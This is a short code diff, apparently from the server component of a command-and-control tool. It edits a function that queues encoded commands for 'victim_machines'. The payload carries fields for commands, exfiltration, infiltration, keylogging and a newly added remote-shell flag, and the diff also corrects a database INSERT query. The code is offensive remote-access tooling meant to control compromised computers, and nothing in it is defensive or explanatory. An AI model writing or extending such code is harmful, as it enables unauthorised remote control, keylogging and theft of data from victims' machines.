@@ -67,10 +67,10 @@ def editcommand( id, command ):
 			seconds_from_epoch = int(time.time())
 			empty_json = "e30="
 			default_group_id = 1
-			formatted_command = "{\"commands\": {\"" + str(seconds_from_epoch) + "\": \"" + command + "\"}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": 0}"
+			formatted_command = "{\"commands\": {\"" + str(seconds_from_epoch) + "\": \"" + command + "\"}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": 0, \"shell\": 0}"
 			formatted_encoded = encode(formatted_command)
 
-			create_query = """ INSERT INTO victim_machines (victim_id, group_id, command, command_output, command_record, file_names, keylogger) VALUES (%s, %s, %s, %s, %s, %s) """
+			create_query = """ INSERT INTO victim_machines (victim_id, group_id, command, command_output, command_record, file_names) VALUES (%s, %s, %s, %s, %s, %s) """
 			create_data = (id, default_group_id, formatted_encoded,empty_json, formatted_encoded, empty_json)
 
 			cursor.execute(create_query, create_data)
